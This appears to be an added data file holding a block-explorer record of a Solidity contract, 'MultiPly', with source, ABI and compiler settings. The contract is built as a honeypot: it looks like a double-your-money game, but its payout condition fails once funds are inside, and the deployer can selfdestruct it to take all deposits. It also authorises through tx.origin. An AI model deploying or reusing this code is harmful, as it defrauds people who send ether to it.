@@ -1,0 +1,24 @@
+{
+    "status": "1",
+    "message": "OK",
+    "result": [
+        {
+            "SourceCode": "pragma solidity ^0.4.25;\r\n\r\ncontract MultiPly\r\n{\r\n    address O = tx.origin;\r\n    function() public payable {}\r\n    function vx() public {if(tx.origin==O)selfdestruct(tx.origin);}\r\n    function ply() public payable {\r\n        if (msg.value >= this.balance) {\r\n            tx.origin.transfer(this.balance);\r\n        }\r\n    }\r\n }",
+            "ABI": "[{\"constant\":false,\"inputs\":[],\"name\":\"vx\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"ply\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]",
+            "ContractName": "MultiPly",
+            "CompilerVersion": "v0.4.25+commit.59dbf8f1",
+            "CompilerType": "solc",
+            "OptimizationUsed": "1",
+            "Runs": "200",
+            "ConstructorArguments": "",
+            "EVMVersion": "Default",
+            "Library": "",
+            "ContractFileName": "",
+            "LicenseType": "",
+            "Proxy": "0",
+            "Implementation": "",
+            "SwarmSource": "bzzr://ccca0df2c399c831276ec2777a9cfdc4b0fd0c2850ff9af7362bfd21ba9480b1",
+            "SimilarMatch": ""
+        }
+    ]
+}
